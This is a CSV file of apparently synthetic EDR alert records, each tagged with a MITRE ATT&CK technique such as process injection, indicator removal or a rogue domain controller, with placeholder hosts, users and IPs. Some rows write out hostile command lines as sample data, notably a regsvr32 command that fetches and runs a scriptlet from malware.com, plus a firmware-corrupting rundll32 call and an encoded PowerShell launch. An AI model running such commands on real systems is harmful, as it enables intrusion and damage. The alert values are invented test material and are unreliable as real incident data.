020490,,2023-03-10T12:00:00Z,,,,Exploitation for Defense,"dversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",,,,,,Exploitation for Defense Evasion,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\system32\cmd.exe,cmd.exe,cmd.exe /c echo hello world,,,192.168.1.100,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,TCP,,,,,,,,,,,,Endpoint,server01,admin,Windows,4444,Blocked,Exploit detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020304,,2022-04-01T14:30:00Z,,,,External Remote Services Connection,A connection to an external remote service has been detected.,,,,,,,,,,,,"explorer.exe /root,C:\Windows\system32",,"['Block the connection to the external remote service.', 'Investigate the process and parent process to determine if they are legitimate.']",,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,cmd.exe,cmd.exe /c dir,,,,,,,,,,,,,,,,,,,,TCP,,,10.0.0.2,8080,,,,,,C:\Windows\system32\cmd.exe,C:\Windows\explorer.exe,,,,,,,,1234,5678,Outbound,Unknown,Unknown,"['8080', '8443']",10.0.0.2,,http://10.0.0.2:8080,,Unknown,Unknown,Unknown,Unknown,Unknown,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
020405,,2023-03-10T13:00:00Z,,,,Permissions Modification,Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.,,,,,,File and Directory Permissions Modification,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\system32\config\SAM,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,workstation01,user01,,,Blocked,Unauthorized file permission change,,,,,,,,,,,,,,,,SYSTEM,Full Control,Read-only,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
032040f06,,2022-03-06T09:18:56Z,,,,Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.",,,,,,,,,,,,"cmd.exe /c rundll32.exe bios.dll,CorruptFirmware",EDR,,,,,,,,,,High,,,,12345,Firmware Attack,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0000w0r,,,,,,Hardware Additions,"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access.",,,,,,,,,,,,,,"['Investigate the hardware addition to determine if it is legitimate or unauthorized', 'If the hardware is unauthorized, remove it from the endpoint immediately', 'Consider implementing endpoint security controls to prevent unauthorized hardware additions']",,,,,,,,,High,,,EndpointDetection,,Malware,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,EventType,Equals,HardwareAddition,"['T1200', 'Hardware Additions', 'Endpoint Detection']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dkfkgl,,2023-03-10T15:00:00Z,,,,Hijack Execution Flow,"Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time.",,,,,,Hijack Execution Flow,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,svchost.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Unauthorized process injection,,,,,,,,,,,,,,,,,,,,,,,malware.exe,Reflective DLL Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0294fty,,2023-03-10T16:00:00Z,,,,Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior.",,,,,,Impair Defenses,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,laptop01,user01,,,Blocked,Unauthorized security control disablement,,,,,,,,,,,,,,,,,,,,,,,,,Windows Defender Antivirus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-34567,,2022-10-31T15:20:30Z,High,,,Implant Internal Image,Implant internal image detected on PC-1234,,,,,,,,,,,,,,,,,,,internal_image.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,8bc6ab5d6ec7f21202fc9c9358c62d53e1e7ed1a,C:\Program Files (x86)\MyApp\internal_image.dll,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
asdfkwkl45,,2023-03-10T17:00:00Z,,,,Indicator Removal,Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses.,,,,,,Indicator Removal,,,,,,,,,,,,,,,,,High,,File Deletion,,,,,,,,,,,,,,,Defense Evasion,,,C:\ProgramData\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized file deletion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30405607356,,2023-03-10T18:00:00Z,,,,Indirect Command Execution,Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters.,,,,,,Indirect Command Execution,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,Execution,,,,regsvr32.exe,regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Unauthorized command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
222221,,2022-03-03T13:42:17Z,,,,Unusual Parent Process,A suspicious parent child process relationship with cmd.exe descending from an unusual process was detected.,,,,,,,,,,,,,,,,,,,,,,,High,Command and Scripting Interpreter,,,,Command and Scripting Interpreter (T1059.003),,,,,,,,EDR,,,,,,DESKTOP-ABC123,,cmd.exe,cmd.exe /c echo 'Hello World',,,,JohnDoe,,,,,,,,,,,,,,,MyCustomProcess.exe,,,,,,,,,,,,['Command and Scripting Interpreter'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,"{'ParentProcessName': 'MyCustomProcess.exe', 'ParentProcessPath': 'C:\\Program Files\\MyApp\\MyCustomProcess.exe', 'ParentProcessCommandLine': 'MyCustomProcess.exe /run'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
75668383,,2023-03-10T18:00:00Z,,,,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials.",,,,,,Modify Authentication Process,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,Userinit,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
039403802,,2023-03-10T19:00:00Z,,,,Modify Cloud Compute Infrastructure,"An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.",,,,,,Modify Cloud Compute Infrastructure,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin01,,,Blocked,Unauthorized modification of cloud compute instance attribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AWS,ModifyInstanceAttribute,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02040506,,2023-03-10T20:00:00Z,,,,Modify System Image,Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.,,,,,,Modify System Image,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Defense Evasion,,,C:\Windows\System32\ntoskrnl.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,system,,,Blocked,Unauthorized modification of system file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,,2023-03-10T14:30:00Z,,,,Network Boundary Bridging,Defender for Endpoint EDR has detected network boundary bridging activity in the environment.,,,,,,,,,,,,"C:\Windows\explorer.exe /root,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-A2DD-08002B30309D}\::{2227A280-3AEA-1069-A2DE-08002B30309D}",Behavioral Analysis,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,TCP,,,,80,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\explorer.exe,,,EXAMPLE_USER,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Network Boundary Bridging (T1599),192.168.1.100,10.0.0.2,example.com,Network Boundary Bridging,TCP traffic from an internal IP address to an external IP address,ABCD1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,,2022-03-09T10:42:11.000Z,,,,Denial of Service,Defender for Endpoint has detected a network denial of service (DoS) attack on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.101,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10 Pro,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,company.local,,,,COMPANY-PC01,10.0.0.2,192.168.1.101,UDP Flood,120 seconds,"HTTP, DNS, FTP",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
eorof05,,2023-03-10T11:15:00Z,,,,Plist Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses.",,,,,,Plist File Modification,,,/Library/LaunchDaemons/com.apple.plist,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the nature and purpose of the plist modification and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,,2022-10-31T00:00:00Z,,,,Private Key Interception,Private key interception detected on host PC-1234,,,,,,,,,,,,,,,,,,,private_key.pem,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\User1\Documents,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,High,File quarantined,Behavior monitoring,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1350df0e,,2023-03-10T13:30:00Z,,,,Process Injection,Process injection is a method of executing arbitrary code in the address space of a separate live process.,,,,,,Process Injection,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,explorer.exe,notepad.exe,Thread Execution Hijacking,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567,,2023-03-09T15:45:00Z,,,,Proxy Connection,Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,,,,,,,,,,,,,Proxy Detection,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,High,,,Endpoint detection,,,,,,,,,,Network Traffic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
defender_endpoint_alert_12345,,2022-01-01T12:34:56.789Z,High,,,RAdmin Tool,Remote access tools (RAdmin) may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,machine-12345,user-67890,1234.0,C:\Program Files (x86)\RAdmin Viewer\rview.exe,RAdmin Tool Used,RAdmin Tool Used to Remotely Control Workstations,192.168.1.100,4899,192.168.1.101,1234,TCP,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304r95p,,2022-03-04T10:25:00Z,,,,Possible Removable Media Replication,"Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.",,,,,,,,,C:\Users\User\Documents\SensitiveData.docx,,,,Endpoint Monitoring,,,,,,,,,,High,,,RemovableMediaDetection,,Endpoint Detection and Response,,,,,,,,,,,,Initial Access,,,,explorer.exe,explorer.exe C:\Users\User\Documents\SensitiveData.docx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,C:\Windows\explorer.exe,,,User,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-12345,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Device,SanDisk,USB flash drive,123456,16 GB,2022-03-04T10:25:00Z,Copied Files,2 MB,Replication Through Removable Media,192.168.1.2,1909,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0e0r0tq,,2022-03-07T14:23:54.123Z,,,,Resource Hijacking,A suspicious process is attempting to hijack system resources on the endpoint.,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Resource Hijacking,Malware,memory,write,attempt to overwrite critical memory region,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
030495,,2023-03-10T16:15:00Z,,,,Rogue Controller,Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC).,,,,,,Rogue Domain Controller,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and investigate the nature and purpose of the rogue domain controller. Remove the unauthorized domain controller and remediate any affected systems.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,,,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,dc1.malicious.local,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0pd0d03wr,,2023-03-03T10:15:30Z,,,,Serverless Execution,Potential serverless execution detected via PowerShell execution with encoded command.,,,,,High,Serverless Execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defender for Endpoint,,,,Execution,,,,powershell.exe,-EncodedCommand,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,9D73B2CF2A1C728FE8B282FDC7EE5DE5,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Process Creation,,,,,,,powershell.exe -encodedCommand,4688,2E20D26F9C1ACB5547D5BDA70FEBD054,Blocked,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
klfdlf0567,,2022-03-06T10:30:00Z,,,,Service Stop,Defender for Endpoint detected a suspicious stop of a Windows service.,,,,,,,,,,,,,EDR,"['Investigate the reason for the suspicious stop of the service.', ""Review the service's configuration to ensure it is properly configured."", 'Monitor for any further suspicious activity.']",,,,,,,,,High,,,,,Process/Service Stop,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ServiceName,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,SuspiciousServiceName,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
